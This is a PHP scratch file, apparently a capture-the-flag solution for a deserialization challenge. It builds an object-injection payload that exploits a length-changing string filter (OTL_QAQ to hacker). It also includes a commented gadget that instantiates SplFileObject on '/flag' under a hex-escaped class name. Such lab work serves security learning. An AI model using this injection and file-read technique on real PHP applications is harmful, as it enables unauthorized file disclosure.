<?php

//class catalogue{
//    public $class;
//    public $data;
//    public function __construct()
//    {
//        $this->class = 'SplFileObject';
//        $this->data = '/flag';
//    }
////    public function __destruct()
////    {
////        echo new $this->class($this->data);
////    }
//}
//echo serialize(new catalogue());
////O:9:"catalogue":2:{s:5:"class";S:13:"SplFile\4Fbject";s:4:"data";s:5:"/flag";}

class catalogue{
    public $class;
    public $data;
    public function __construct()
    {
        $this->class = "error";
        $this->data = "hacker";
    }
    public function __destruct()
    {
        echo new $this->class($this->data);
    }
}
class escape{
    public $name = 'OTL';
    public $phone = '123666';
    public $email = 'sweet@OTL.com';
}
function abscond($string) {
    $filter = array('NSS', 'CTF', 'OTL_QAQ', 'hello');
    $filter = '/' . implode('|', $filter) . '/i';
    return preg_replace($filter, 'hacker', $string);
}
$abscond = new escape();
//$abscond->name = 'NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShellohello";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}';
//$abscond->phone = array(1);
//$abscond->email = "/flag";
//echo serialize($abscond);
//O:6:"escape":3:{s:4:"name";s:1:"1";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}
//echo strlen('";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}');
//53=17*3+2
//O:6:"escape":3:{s:4:"name";s:114:"NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShellohello";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}
//echo strlen('";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}');
//53



$abscond->name = 'OTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQOTL_QAQ';
$abscond->phone = '";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}';
$abscond->email = 1;
//var_dump($abscond);
var_dump(serialize($abscond));
$abscond = serialize($abscond);
var_dump(unserialize(abscond($abscond)));
//echo strlen('";s:5:"phone";s:10:"');
//20